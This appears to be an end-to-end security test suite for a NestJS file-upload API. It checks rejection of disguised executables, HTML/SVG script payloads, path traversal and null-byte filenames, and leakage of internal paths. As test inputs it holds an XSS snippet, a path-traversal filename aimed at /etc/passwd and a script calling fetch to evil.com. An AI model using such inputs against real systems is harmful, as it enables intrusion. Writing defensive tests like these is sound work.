import { INestApplication } from '@nestjs/common';
// eslint-disable-next-line @typescript-eslint/no-require-imports
const request = require('supertest') as typeof import('supertest');
import { createTestApp, createAuthenticatedUser } from './helpers';

/**
 * File Upload Security E2E tests (Phase 2 — Coverage Gaps).
 *
 * Tests cover edge cases for file upload validation:
 * - Invalid MIME types / magic byte mismatches
 * - Oversized files
 * - Path traversal in filenames
 * - Null bytes in filenames
 * - Empty files
 * - Unsupported file types
 * - Missing file field
 *
 * NOTE: Tests accept 500 when S3/MinIO/ClamAV is unavailable, since
 * validation may happen after service-level checks in the pipeline.
 * The key assertion is that invalid files get 400 and not 202.
 */
describe('File Upload Security (E2E)', () => {
  let app: INestApplication;

  beforeAll(async () => {
    app = await createTestApp();
  });

  afterAll(async () => {
    await app.close();
  });

  // Valid JPEG buffer (1x1 pixel) for comparison
  function createTestJpegBuffer(): Buffer {
    return Buffer.from([
      0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46,
      0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
      0x00, 0x01, 0x00, 0x00, 0xff, 0xdb, 0x00, 0x43,
      0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08,
      0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0a, 0x0c,
      0x14, 0x0d, 0x0c, 0x0b, 0x0b, 0x0c, 0x19, 0x12,
      0x13, 0x0f, 0x14, 0x1d, 0x1a, 0x1f, 0x1e, 0x1d,
      0x1a, 0x1c, 0x1c, 0x20, 0x24, 0x2e, 0x27, 0x20,
      0x22, 0x2c, 0x23, 0x1c, 0x1c, 0x28, 0x37, 0x29,
      0x2c, 0x30, 0x31, 0x34, 0x34, 0x34, 0x1f, 0x27,
      0x39, 0x3d, 0x38, 0x32, 0x3c, 0x2e, 0x33, 0x34,
      0x32, 0xff, 0xc0, 0x00, 0x0b, 0x08, 0x00, 0x01,
      0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xff, 0xc4,
      0x00, 0x1f, 0x00, 0x00, 0x01, 0x05, 0x01, 0x01,
      0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04,
      0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0xff,
      0xc4, 0x00, 0xb5, 0x10, 0x00, 0x02, 0x01, 0x03,
      0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04,
      0x00, 0x00, 0x01, 0x7d, 0x01, 0x02, 0x03, 0x00,
      0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06,
      0x13, 0x51, 0x61, 0x07, 0x22, 0x71, 0x14, 0x32,
      0x81, 0x91, 0xa1, 0x08, 0x23, 0x42, 0xb1, 0xc1,
      0x15, 0x52, 0xd1, 0xf0, 0x24, 0x33, 0x62, 0x72,
      0x82, 0x09, 0x0a, 0x16, 0x17, 0x18, 0x19, 0x1a,
      0x25, 0x26, 0x27, 0x28, 0x29, 0x2a, 0x34, 0x35,
      0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
      0x3f, 0x00, 0x7b, 0x94, 0x11, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0xff, 0xd9,
    ]);
  }

  // Valid PDF buffer for comparison
  function createTestPdfBuffer(): Buffer {
    const pdfContent =
      '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n' +
      '2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
      '3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj\n' +
      'xref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n' +
      '0000000058 00000 n \n0000000115 00000 n \n' +
      'trailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF';
    return Buffer.from(pdfContent);
  }

  describe('MIME type / magic byte validation', () => {
    it('should reject a file with mismatched MIME type (EXE disguised as PDF)', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `mime-mismatch-${Date.now()}@test.com`,
      });

      // EXE magic bytes: MZ (4D 5A)
      const exeBuffer = Buffer.from([
        0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
      ]);

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', exeBuffer, {
          filename: 'malicious.pdf', // claims to be PDF
          contentType: 'application/pdf',
        });

      // Should reject — magic bytes don't match declared MIME
      expect([400, 500]).toContain(res.status);
      // Must NOT return 202 (accepted)
      expect(res.status).not.toBe(202);
    });

    it('should reject a file with disallowed MIME type (HTML)', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `mime-html-${Date.now()}@test.com`,
      });

      const htmlBuffer = Buffer.from('<html><body><script>alert("xss")</script></body></html>');

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', htmlBuffer, {
          filename: 'malicious.html',
          contentType: 'text/html',
        });

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });

    it('should reject a JavaScript file disguised as image', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `mime-js-${Date.now()}@test.com`,
      });

      const jsBuffer = Buffer.from('function exploit() { fetch("http://evil.com") }');

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', jsBuffer, {
          filename: 'script.jpg',
          contentType: 'image/jpeg',
        });

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });

    it('should reject a SVG file (potential XSS vector)', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `mime-svg-${Date.now()}@test.com`,
      });

      const svgBuffer = Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
      );

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', svgBuffer, {
          filename: 'image.svg',
          contentType: 'image/svg+xml',
        });

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });
  });

  describe('Filename sanitization', () => {
    it('should reject or sanitize path traversal in filename', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `path-trav-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', createTestPdfBuffer(), {
          filename: '../../../etc/passwd',
          contentType: 'application/pdf',
        });

      // Should either reject (400) or sanitize the filename
      // Must NOT store the file at a traversed path
      expect([202, 400, 500]).toContain(res.status);
      if (res.status === 202) {
        // If accepted, the stored filename should not contain path traversal
        const storedName = res.body.data?.originalFilename || res.body.data?.filename || '';
        expect(storedName).not.toContain('..');
        expect(storedName).not.toContain('/');
      }
    });

    it('should reject filenames with null bytes', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `null-byte-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', createTestPdfBuffer(), {
          filename: 'document.pdf\x00.exe',
          contentType: 'application/pdf',
        });

      // Should reject or sanitize null bytes
      expect([202, 400, 500]).toContain(res.status);
      if (res.status === 202) {
        const storedName = res.body.data?.originalFilename || res.body.data?.filename || '';
        expect(storedName).not.toContain('\x00');
      }
    });

    it('should handle double-extension filenames', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `double-ext-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', createTestPdfBuffer(), {
          filename: 'document.pdf.exe',
          contentType: 'application/pdf',
        });

      // Magic byte validation should catch the mismatch if content differs,
      // but with valid PDF content the file may be accepted with sanitized name
      expect([202, 400, 500]).toContain(res.status);
    });
  });

  describe('Camera scan — invalid file types', () => {
    it('should reject non-image files on camera scan endpoint', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `scan-nonimg-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads/camera-scan')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('files', createTestPdfBuffer(), {
          filename: 'not-an-image.pdf',
          contentType: 'application/pdf',
        })
        .field('captureMode', 'single_page');

      // Camera scan should only accept images (jpeg, png, webp)
      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });

    it('should reject text files disguised as images on camera scan', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `scan-text-${Date.now()}@test.com`,
      });

      const textBuffer = Buffer.from('This is not an image, just plain text content.');

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads/camera-scan')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('files', textBuffer, {
          filename: 'fake.jpg',
          contentType: 'image/jpeg',
        })
        .field('captureMode', 'single_page');

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });
  });

  describe('Empty and missing files', () => {
    it('should reject empty file upload', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `empty-file-${Date.now()}@test.com`,
      });

      const emptyBuffer = Buffer.alloc(0);

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', emptyBuffer, {
          filename: 'empty.pdf',
          contentType: 'application/pdf',
        });

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });

    it('should reject request with no file attached', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `no-file-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .send({});

      // Should return 400 (no file) not 202
      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });

    it('should reject camera scan with no files attached', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `no-scan-files-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads/camera-scan')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .field('captureMode', 'single_page');

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });
  });

  describe('Camera scan — input validation', () => {
    it('should reject invalid captureMode', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `invalid-mode-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads/camera-scan')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('files', createTestJpegBuffer(), {
          filename: 'scan.jpg',
          contentType: 'image/jpeg',
        })
        .field('captureMode', 'invalid_mode');

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });

    it('should reject invalid privacyLevel', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `invalid-privacy-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads/camera-scan')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('files', createTestJpegBuffer(), {
          filename: 'scan.jpg',
          contentType: 'image/jpeg',
        })
        .field('captureMode', 'single_page')
        .field('privacyLevel', 'public'); // not a valid option

      expect([400, 500]).toContain(res.status);
      expect(res.status).not.toBe(202);
    });
  });

  describe('Upload response security', () => {
    it('should not expose internal file paths in response', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `no-paths-${Date.now()}@test.com`,
      });

      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', createTestPdfBuffer(), {
          filename: 'safe-doc.pdf',
          contentType: 'application/pdf',
        });

      if (res.status === 202) {
        const body = JSON.stringify(res.body);
        // Should not contain internal paths
        expect(body).not.toContain('/tmp/');
        expect(body).not.toContain('/var/');
        expect(body).not.toContain('C:\\');
        expect(body).not.toContain('\\Users\\');
      }
    });

    it('should not expose S3 keys or bucket names in error responses', async () => {
      const user = await createAuthenticatedUser(app, {
        email: `no-s3-leak-${Date.now()}@test.com`,
      });

      // Send an invalid file to trigger an error
      const res = await request(app.getHttpServer())
        .post('/api/v1/uploads')
        .set('Authorization', `Bearer ${user.accessToken}`)
        .attach('file', Buffer.from('invalid'), {
          filename: 'bad.pdf',
          contentType: 'application/pdf',
        });

      if (res.status >= 400) {
        const body = JSON.stringify(res.body);
        expect(body).not.toContain('libertasian-uploads');
        expect(body).not.toContain('libertasian-corpus');
        expect(body).not.toContain('minio');
        expect(body).not.toContain('AccessKeyId');
        expect(body).not.toContain('SecretAccessKey');
      }
    });
  });
});
